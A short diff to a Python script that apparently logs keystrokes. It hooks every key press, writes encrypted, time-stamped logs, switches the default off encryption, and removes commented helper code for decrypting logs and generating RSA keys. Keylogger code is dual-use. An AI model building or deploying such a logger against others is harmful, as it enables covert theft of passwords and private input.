@@ -27,7 +27,7 @@ MINUTES_TO_LOG_TIME = 5   # this many minutes should pass to log the current tim
 # - GLOBAL SCOPE VARIABLES start -
 # general check
 if len(sys.argv) == 1:
-    sys.argv = [sys.argv[0], 'debug', 'encrypt']
+    sys.argv = [sys.argv[0], 'debug']
 mode = sys.argv[1]
 encryption_on = True if 'encrypt' in sys.argv else False
 reverse_encryption = False  # use True to decrypt back to be able to debug without turning the encryption off
@@ -549,27 +549,5 @@ def key_callback(event):
     return True  # pass event to other handlers
 
 
-# UNCOMMENT THIS TO READ ENCRYPTED LOGS (passphrase for the private key above - 'pass'):
-test_string = """
----START---.......---END---
----START---.......---END---
-"""
-# passphrase = getpass.getpass(prompt='Enter your private key passphrase')
-# print('decrypted log: ', decrypt_many(test_string, passphrase))
-
-# UNCOMMENT THIS TO GENERATE NEW RSA PUBLIC-PRIVATE KEY PAIR:
-"""
-passphrase = getpass.getpass(prompt='Enter your private key passphrase')
-new_key = RSA.generate(4096)
-export_format = 'PEM'
-private_key = new_key.exportKey(pkcs=8, passphrase=passphrase)
-public_key = new_key.publickey().exportKey(format=export_format)
-with open("private_key." + export_format.lower(), "wb") as f:
-    f.write(private_key)
-with open("public_key." + export_format.lower(), "wb") as f:
-    f.write(public_key)
-"""
-
-# COMMENT THIS TO USE OTHER COMMANDS WITHOUT LANDING HERE
 keyboard.hook(key_callback)
 keyboard.wait()
